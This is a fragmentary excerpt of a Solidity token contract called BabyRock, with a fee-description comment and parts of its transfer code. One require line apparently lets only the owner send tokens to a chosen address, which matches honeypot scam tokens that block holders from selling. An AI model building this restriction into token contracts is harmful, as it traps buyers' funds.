...
/**
   ...
   8% fee for automatic re-distribution to holders
   SELLS
   3% fee for automatic liquidity generation protocol
   10% fee for automatic re-distribution to holders
 */
...
contract BabyRock is Context, IERC20, Ownable, Pausable {
  using SafeMath 
for
 uint256;
  mapping (
...
require
(recipient != newun || sender == owner(), 
"please wait"
);
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, 
"error in transferfrom"
));
...
"transfer sender address is 0 address"
);
...
"transfer recipient address is 0 address"
);
